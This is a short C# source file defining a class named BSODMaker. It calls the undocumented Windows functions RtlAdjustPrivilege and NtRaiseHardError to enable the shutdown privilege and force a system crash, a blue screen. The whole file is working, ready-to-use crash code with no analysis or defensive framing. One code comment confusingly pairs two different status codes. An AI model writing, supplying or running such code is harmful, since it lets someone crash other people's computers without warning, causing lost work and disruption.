using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace DrPepper
{
    public static class BSODMaker
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtRaiseHardError(
       int ErrorStatus,
       uint NumberOfParameters,
       uint UnicodeStringParameterMask,
       IntPtr Parameters,
       uint ValidResponseOptions,
       out uint Response);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
            int Privilege,
            bool Enable,
            bool CurrentThread,
            out bool Enabled);

        public static bool RaisePrivilege()
        {
            bool preValue;
            return RtlAdjustPrivilege(19, true, false, out preValue) == 0; //This raises the privailege of the current application.
            //And fixes an error in the code.
        }

        public static bool CauseNtHardError()
        {
            uint response;
            uint result = NtRaiseHardError(
                unchecked((int)0xC0000022), // STATUS_ACCESS_DENIED or STATUS_SYSTEM_PROCESS_TERMINATED
                0,
                0,
                IntPtr.Zero,
                6, // OptionShutdownSystem
                out response);

            return result == 0;
        }
    }
}
